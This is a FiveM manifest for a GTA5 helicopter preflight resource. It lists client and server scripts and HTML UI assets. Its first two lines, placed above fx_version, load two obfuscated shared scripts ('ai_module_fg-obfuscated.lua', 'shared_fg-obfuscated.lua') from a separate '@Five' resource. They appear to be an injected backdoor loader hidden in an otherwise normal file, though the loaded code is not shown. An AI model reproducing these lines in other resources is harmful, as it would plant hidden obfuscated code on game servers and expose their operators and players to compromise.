shared_script '@Five/ai_module_fg-obfuscated.lua'
shared_script '@Five/shared_fg-obfuscated.lua'
fx_version 'cerulean'
games { 'gta5' }

author 'REDЯUM#9999'
description 'RM Heli Preflight'
version '1.0.0'

ui_page "html/index.html"

client_scripts {
    'client.lua'
}

server_scripts {
    'server.lua'
}

files {
    'html/*.html',
    'html/*.js',
    'html/*.css',
    'html/*.png'
}